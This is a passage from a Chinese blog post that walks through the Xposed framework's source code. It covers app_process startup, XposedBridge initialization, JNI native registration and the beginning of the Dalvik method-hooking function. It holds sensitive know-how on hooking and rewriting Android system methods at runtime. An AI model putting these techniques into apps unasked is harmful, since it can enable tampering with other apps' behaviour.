<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Handle special command line options. */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">handleOptions</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* <span class="type">const</span> argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">parseXposedProp</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--xposedversion&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Xposed version: %s\n&quot;</span>, xposedVersion);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--xposedtestsafemode&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Testing Xposed safemode trigger\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">detectSafemodeTrigger</span>(<span class="built_in">shouldSkipSafemodeDelay</span>())) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Safemode triggered\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Safemode not triggered\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// From Lollipop coding, used to override the process name</span></span><br><span class="line">    argBlockStart = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uintptr_t</span> start = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">uintptr_t</span> end = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(argv[argc - <span class="number">1</span>]);</span><br><span class="line">    end += <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">    argBlockLength = end - start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main 函数中，启动的时候增加了启动一些逻辑.</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-25-24.png" class="">

<p>具体的， 我们可以看到。<code>runtime.start</code> 那一段。做出了一个启动。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">isXposedLoaded = xposed::<span class="built_in">initialize</span>(zygote, startSystemServer, className, argc, argv);</span><br><span class="line"><span class="keyword">if</span> (zygote) &#123;</span><br><span class="line">    <span class="comment">// 当xposed成功启动的时候，start XPOSED_CLASS_DOTS_ZYGOTE这个类</span></span><br><span class="line">    runtime.<span class="built_in">start</span>(isXposedLoaded ? XPOSED_CLASS_DOTS_ZYGOTE : <span class="string">&quot;com.android.internal.os.ZygoteInit&quot;</span>,</span><br><span class="line">            startSystemServer ? <span class="string">&quot;start-system-server&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className) &#123;</span><br><span class="line">    <span class="comment">// Remainder of args get passed to startup class main()</span></span><br><span class="line">    runtime.mClassName = className;</span><br><span class="line">    runtime.mArgC = argc - i;</span><br><span class="line">    runtime.mArgV = argv + i;</span><br><span class="line">    <span class="comment">// 当xposed成功启动的时候，start XPOSED_CLASS_DOTS_ZYGOTE这个类</span></span><br><span class="line">    runtime.<span class="built_in">start</span>(isXposedLoaded ? XPOSED_CLASS_DOTS_TOOLS : <span class="string">&quot;com.android.internal.os.RuntimeInit&quot;</span>,</span><br><span class="line">            application ? <span class="string">&quot;application&quot;</span> : <span class="string">&quot;tool&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error: no class name or --zygote supplied.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">app_usage</span>();</span><br><span class="line">    <span class="built_in">LOG_ALWAYS_FATAL</span>(<span class="string">&quot;app_process: no class name or --zygote supplied.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的我们看到，在 main 函数中启动了逻辑，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runtime.start(isXposedLoaded ? XPOSED_CLASS_DOTS_ZYGOTE : &quot;com.android.internal.os.ZygoteInit&quot;,</span><br><span class="line">                startSystemServer ? &quot;start-system-server&quot; : &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>其中， XPOSED_CLASS_DOTS_ZYGOTE 变量在，<code>xposed.h</code> 头文件中有定义，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> XPOSED_CLASS_DOTS_ZYGOTE <span class="string">&quot;de.robv.android.xposed.XposedBridge&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>其实这个类就是我们之前向私有目录防止的 XposedBridge 项目的包名。</p>
<p>而 <code>runtime.start</code> 这个包名有什么作用呢？我们在 AndroidRuntime 中找到 start 方法的具体逻辑。</p>
<p>在源代码中<code>/frameworks/base/core/jni/AndroidRuntime.cpp</code>中看到</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Start the Android runtime.  This involves starting the virtual machine</span></span><br><span class="line"><span class="comment"> * and calling the &quot;static void main(String[] args)&quot; method in the class</span></span><br><span class="line"><span class="comment"> * named by &quot;className&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Passes the main function two arguments, the class name and the specified</span></span><br><span class="line"><span class="comment"> * options string.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AndroidRuntime::start</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* className, <span class="type">const</span> <span class="type">char</span>* options)</span></span></span><br></pre></td></tr></table></figure>

<p>系统源码对 start 方法的定义，就是启动对应类的 start void main 入口函数。这里，就将三个项目的逻辑连接起来了。</p>
<h2 id="XposedBridge-java"><a href="#XposedBridge-java" class="headerlink" title="XposedBridge.java"></a>XposedBridge.java</h2><p>我们在 <code>XposedBridge.java</code> 代码中，看到其 main 方法，如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Called when native methods and other things are initialized, but before preloading classes etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// Initialize the Xposed framework and modules</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SELinuxHelper.initOnce();</span><br><span class="line">        SELinuxHelper.initForProcess(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        runtime = getRuntime();</span><br><span class="line">        <span class="keyword">if</span> (initNative()) &#123;</span><br><span class="line">            XPOSED_BRIDGE_VERSION = getXposedVersion();</span><br><span class="line">            <span class="keyword">if</span> (isZygote) &#123;</span><br><span class="line">                startsSystemServer = startsSystemServer();</span><br><span class="line">                <span class="comment">// 为启动一个新的 zygote做好 hook准备</span></span><br><span class="line">                initForZygote();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 载入Xposed的一些modules</span></span><br><span class="line">            loadModules();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;Errors during native Xposed initialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        log(<span class="string">&quot;Errors during Xposed initialization&quot;</span>);</span><br><span class="line">        log(t);</span><br><span class="line">        disableHooks = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用系统原来的启动方法</span></span><br><span class="line">    <span class="keyword">if</span> (isZygote)</span><br><span class="line">        ZygoteInit.main(args);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        RuntimeInit.main(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么，整个 app_process 的复制 hook 逻辑，到这里我们已经清楚了。逻辑如下图所示。</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-27-01.png" class="">

<p>那么，xposed 具体怎么实现系统 api 逻辑的 replace 和 inject 我们下次在做分析。</p>
<h1 id="Xposed源码剖析——Xposed初始化"><a href="#Xposed源码剖析——Xposed初始化" class="headerlink" title="Xposed源码剖析——Xposed初始化"></a>Xposed源码剖析——Xposed初始化</h1><p>之前我们看过了 <code>app_main.cpp</code> 源码，知道了在其中，启动了 <code>XposedBridge.jar</code> 方法。那么，其中还做了些什么事情呢？</p>
<p>之前我们也看到了在 <code>app_main.cpp</code> 还有几处新增的逻辑。xposed::initialize和onVmCreated回调。下面我在仔细的阅读以下源码。</p>
<h2 id="xposed-initialize初始化"><a href="#xposed-initialize初始化" class="headerlink" title="xposed::initialize初始化"></a>xposed::initialize初始化</h2><img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-28-24.png" class="">

<p>对于 <code>xposed::initalize</code> 的初始化工作，我们能够在 <code>xposed.cpp</code> 中看到其具体的逻辑实现。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 初始化xposed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">initialize</span><span class="params">(<span class="type">bool</span> zygote, <span class="type">bool</span> startSystemServer, <span class="type">const</span> <span class="type">char</span>* className, <span class="type">int</span> argc, <span class="type">char</span>* <span class="type">const</span> argv[])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(XPOSED_ENABLE_FOR_TOOLS)</span></span><br><span class="line">    <span class="keyword">if</span> (!zygote)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    xposed-&gt;zygote = zygote;</span><br><span class="line">    xposed-&gt;startSystemServer = startSystemServer;</span><br><span class="line">    xposed-&gt;startClassName = className;</span><br><span class="line">    xposed-&gt;xposedVersionInt = xposedVersionInt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> XPOSED_WITH_SELINUX</span></span><br><span class="line">    xposed-&gt;isSELinuxEnabled   = <span class="built_in">is_selinux_enabled</span>() == <span class="number">1</span>;</span><br><span class="line">    xposed-&gt;isSELinuxEnforcing = xposed-&gt;isSELinuxEnabled &amp;&amp; <span class="built_in">security_getenforce</span>() == <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    xposed-&gt;isSELinuxEnabled   = <span class="literal">false</span>;</span><br><span class="line">    xposed-&gt;isSELinuxEnforcing = <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// XPOSED_WITH_SELINUX</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (startSystemServer) &#123;</span><br><span class="line">        xposed::logcat::<span class="built_in">start</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (zygote) &#123;</span><br><span class="line">        <span class="comment">// TODO Find a better solution for this</span></span><br><span class="line">        <span class="comment">// Give the primary Zygote process a little time to start first.</span></span><br><span class="line">        <span class="comment">// This also makes the log easier to read, as logs for the two Zygotes are not mixed up.</span></span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印rom信息</span></span><br><span class="line">    <span class="built_in">printRomInfo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (startSystemServer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!xposed::service::<span class="built_in">startAll</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> XPOSED_WITH_SELINUX</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (xposed-&gt;isSELinuxEnabled) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!xposed::service::<span class="built_in">startMembased</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// XPOSED_WITH_SELINUX</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME Zygote has no access to input devices, this would need to be check in system_server context</span></span><br><span class="line">    <span class="keyword">if</span> (zygote &amp;&amp; !<span class="built_in">isSafemodeDisabled</span>() &amp;&amp; <span class="built_in">detectSafemodeTrigger</span>(<span class="built_in">shouldSkipSafemodeDelay</span>()))</span><br><span class="line">        <span class="built_in">disableXposed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isDisabled</span>() || (!zygote &amp;&amp; <span class="built_in">shouldIgnoreCommand</span>(argc, argv)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将XposedBridge.jar的路径添加到环境变量classpath中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">addJarToClasspath</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="onVmCreated-初始化后的准备工作"><a href="#onVmCreated-初始化后的准备工作" class="headerlink" title="onVmCreated 初始化后的准备工作"></a>onVmCreated 初始化后的准备工作</h2><img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-29-28.png" class="">

<p>其具体的逻辑如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">  * 向当前的runtime中载入libxposed_*.so </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onVmCreated</span><span class="params">(JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Determine the currently active runtime</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* xposedLibPath = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">determineRuntime</span>(&amp;xposedLibPath)) &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Could not determine runtime, not loading Xposed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the suitable libxposed_*.so for it</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *error;</span><br><span class="line">    <span class="type">void</span>* xposedLibHandle = <span class="built_in">dlopen</span>(xposedLibPath, RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (!xposedLibHandle) &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Could not load libxposed: %s&quot;</span>, <span class="built_in">dlerror</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Clear previous errors</span></span><br><span class="line">    <span class="built_in">dlerror</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize the library</span></span><br><span class="line">    <span class="built_in">bool</span> (*xposedInitLib)(XposedShared* shared) = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">void</span> **) (&amp;xposedInitLib) = <span class="built_in">dlsym</span>(xposedLibHandle, <span class="string">&quot;xposedInitLib&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!xposedInitLib)  &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Could not find function xposedInitLib&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> XPOSED_WITH_SELINUX</span></span><br><span class="line">    xposed-&gt;zygoteservice_accessFile = &amp;service::membased::accessFile;</span><br><span class="line">    xposed-&gt;zygoteservice_statFile   = &amp;service::membased::statFile;</span><br><span class="line">    xposed-&gt;zygoteservice_readFile   = &amp;service::membased::readFile;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// XPOSED_WITH_SELINUX</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里的xposed变量，其实是一个全局的XposedShare。</span></span><br><span class="line">    <span class="comment">// 调用XposedShare的onVmCreated则会根据不同的vm架构针对不同的实现。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">xposedInitLib</span>(xposed)) &#123;</span><br><span class="line">        xposed-&gt;<span class="built_in">onVmCreated</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="libxposed-dalvik-cpp-hook-环境初始化"><a href="#libxposed-dalvik-cpp-hook-环境初始化" class="headerlink" title="libxposed_dalvik.cpp hook 环境初始化"></a><code>libxposed_dalvik.cpp</code> hook 环境初始化</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Called by Xposed&#x27;s app_process replacement. </span></span><br><span class="line"><span class="comment">  * 在被替换后的app_process中调用</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">xposedInitLib</span><span class="params">(xposed::XposedShared* shared)</span> </span>&#123;</span><br><span class="line">    xposed = shared;</span><br><span class="line">    <span class="comment">// 将自己的onVmCreated方法，指向onVmCreated方法</span></span><br><span class="line">    xposed-&gt;onVmCreated = &amp;onVmCreated;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Called very early during VM startup. </span></span><br><span class="line"><span class="comment">  * 在VM启动的时候调用，而且调用时机比较早</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onVmCreated</span><span class="params">(JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">initMemberOffsets</span>(env))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到小米系统的MIUI_RESOURCE做特殊处理</span></span><br><span class="line">    jclass classMiuiResources = env-&gt;<span class="built_in">FindClass</span>(CLASS_MIUI_RESOURCES);</span><br><span class="line">    <span class="keyword">if</span> (classMiuiResources != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ClassObject* clazz = (ClassObject*)<span class="built_in">dvmDecodeIndirectRef</span>(<span class="built_in">dvmThreadSelf</span>(), classMiuiResources);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dvmIsFinalClass</span>(clazz)) &#123;</span><br><span class="line">            <span class="built_in">ALOGD</span>(<span class="string">&quot;Removing final flag for class &#x27;%s&#x27;&quot;</span>, CLASS_MIUI_RESOURCES);</span><br><span class="line">            clazz-&gt;accessFlags &amp;= ~ACC_FINAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    env-&gt;<span class="built_in">ExceptionClear</span>();</span><br><span class="line"></span><br><span class="line">    jclass classXTypedArray = env-&gt;<span class="built_in">FindClass</span>(CLASS_XTYPED_ARRAY);</span><br><span class="line">    <span class="keyword">if</span> (classXTypedArray == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Error while loading XTypedArray class &#x27;%s&#x27;:&quot;</span>, CLASS_XTYPED_ARRAY);</span><br><span class="line">        <span class="built_in">dvmLogExceptionStackTrace</span>();</span><br><span class="line">        env-&gt;<span class="built_in">ExceptionClear</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">prepareSubclassReplacement</span>(classXTypedArray);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取到全局的XposedBridge</span></span><br><span class="line">    classXposedBridge = env-&gt;<span class="built_in">FindClass</span>(CLASS_XPOSED_BRIDGE);</span><br><span class="line">    classXposedBridge = <span class="built_in">reinterpret_cast</span>&lt;jclass&gt;(env-&gt;<span class="built_in">NewGlobalRef</span>(classXposedBridge));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (classXposedBridge == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Error while loading Xposed class &#x27;%s&#x27;:&quot;</span>, CLASS_XPOSED_BRIDGE);</span><br><span class="line">        <span class="built_in">dvmLogExceptionStackTrace</span>();</span><br><span class="line">        env-&gt;<span class="built_in">ExceptionClear</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册一些 XposedBridge 的 native 方法</span></span><br><span class="line">    <span class="built_in">ALOGI</span>(<span class="string">&quot;Found Xposed class &#x27;%s&#x27;, now initializing&quot;</span>, CLASS_XPOSED_BRIDGE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">register_natives_XposedBridge</span>(env, classXposedBridge) != JNI_OK) &#123;</span><br><span class="line">        <span class="built_in">ALOGE</span>(<span class="string">&quot;Could not register natives for &#x27;%s&#x27;&quot;</span>, CLASS_XPOSED_BRIDGE);</span><br><span class="line">        <span class="built_in">dvmLogExceptionStackTrace</span>();</span><br><span class="line">        env-&gt;<span class="built_in">ExceptionClear</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xposedLoadedSuccessfully = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JNI方法注册逻辑"><a href="#JNI方法注册逻辑" class="headerlink" title="JNI方法注册逻辑"></a>JNI方法注册逻辑</h2><p>这里注册的几个方法都是，Xposed 核心的几个方法函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">register_natives_XposedBridge</span><span class="params">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> JNINativeMethod methods[] = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, getStartClassName, <span class="string">&quot;()Ljava/lang/String;&quot;</span>),</span><br><span class="line">        <span class="comment">// 获得Runtime</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, getRuntime, <span class="string">&quot;()I&quot;</span>),</span><br><span class="line">        <span class="comment">// 启动SystemServer</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, startsSystemServer, <span class="string">&quot;()Z&quot;</span>),</span><br><span class="line">        <span class="comment">// 获取Xposed的版本信息</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, getXposedVersion, <span class="string">&quot;()I&quot;</span>),</span><br><span class="line">        <span class="comment">// 初始化navtive</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, initNative, <span class="string">&quot;()Z&quot;</span>),</span><br><span class="line">        <span class="comment">// hook一个方法的native实现</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, hookMethodNative, <span class="string">&quot;(Ljava/lang/reflect/Member;Ljava/lang/Class;ILjava/lang/Object;)V&quot;</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ART_TARGET</span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, invokeOriginalMethodNative,</span><br><span class="line">            <span class="string">&quot;(Ljava/lang/reflect/Member;I[Ljava/lang/Class;Ljava/lang/Class;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, setObjectClassNative, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/Class;)V&quot;</span>),</span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, dumpObjectNative, <span class="string">&quot;(Ljava/lang/Object;)V&quot;</span>),</span><br><span class="line">        <span class="built_in">NATIVE_METHOD</span>(XposedBridge, cloneToSubclassNative, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/Class;)Ljava/lang/Object;&quot;</span>),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">RegisterNatives</span>(clazz, methods, <span class="built_in">NELEM</span>(methods));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到 RegisterNatives 这个方法的时候不是很理解，这里做一个简介。</p>
<p>以前在 jni 中写本地方法时，都会写成 <code>Java_com_example_hellojni_HelloJni_stringFromJNI</code> 的形式，函数名很长，而且当类名变了的时候，函数名必须一个一个的改，麻烦。</p>
<p>现在好了有了 RegisterNatives ，可以简化我们的书写<br>和传统方法相比，使用 RegisterNative s的好处有三点：</p>
<ol>
<li>C＋＋中函数命名自由，不必像 javah 自动生成的函数声明那样，拘泥特定的命名方式；</li>
<li>效率高。传统方式下，Java 类 call 本地函数时，通常是依靠 VM 去动态寻找 <code>.so</code> 中的本地函数(因此它们才需要特定规则的命名格式)，而使用 RegisterNatives 将本地函数向 VM 进行登记，可以让其更有效率的找到函数；</li>
<li>运行时动态调整本地函数与 Java 函数值之间的映射关系，只需要多次 call  <code>RegisterNatives()</code> 方法，并传入不同的映射表参数即可。</li>
</ol>
<h1 id="Xposed-源码剖析——-hook-具体实现"><a href="#Xposed-源码剖析——-hook-具体实现" class="headerlink" title="Xposed 源码剖析—— hook 具体实现"></a>Xposed 源码剖析—— hook 具体实现</h1><p>之前我们看到了 xposed 各种初始化的工作，其实都是完成了针对系统中各种 method 的 hook 和替换工作。</p>
<p>那么具体如何替换，其实都是调用了其中的。 XposedBridge_hookMethodNative 函数。这里，我们详细的看看 XposedBridge_hookMethodNative 函数中，做了一些什么操作。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 将输入的Class中的Method方法的nativeFunc替换为xposedCallHandler </span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * @param env JniEnv</span></span><br><span class="line"><span class="comment">  * @param reflectedMethodIndirect 待反射的函数</span></span><br><span class="line"><span class="comment">  * @param declaredClassIndirect 定义的class</span></span><br><span class="line"><span class="comment">  * @param slot 函数偏移量</span></span><br><span class="line"><span class="comment">  * @param additionalInfoIndirect 添加的函数</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XposedBridge_hookMethodNative</span><span class="params">(JNIEnv* env, jclass clazz, jobject reflectedMethodIndirect,</span></span></span><br><span class="line"><span class="params"><span class="function">            jobject declaredClassIndirect, jint slot, jobject additionalInfoIndirect)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 容错</span></span><br><span class="line">    <span class="keyword">if</span> (declaredClassIndirect == <span class="literal">NULL</span> || reflectedMethodIndirect == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">dvmThrowIllegalArgumentException</span>(<span class="string">&quot;method and declaredClass must not be null&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据函数的偏移量，从classloader中找到准备替换的函数。</span></span><br><span class="line">    ClassObject* declaredClass = (ClassObject*) <span class="built_in">dvmDecodeIndirectRef</span>(<span class="built_in">dvmThreadSelf</span>(), declaredClassIndirect);</span><br><span class="line">    Method* method = <span class="built_in">dvmSlotToMethod</span>(declaredClass, slot);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">dvmThrowNoSuchMethodError</span>(<span class="string">&quot;Could not get internal representation for method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isMethodHooked</span>(method)) &#123;</span><br><span class="line">        <span class="comment">// already hooked</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存替换前的数据信息</span></span><br><span class="line">    XposedHookInfo* hookInfo = (XposedHookInfo*) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in">sizeof</span>(XposedHookInfo));</span><br><span class="line">    <span 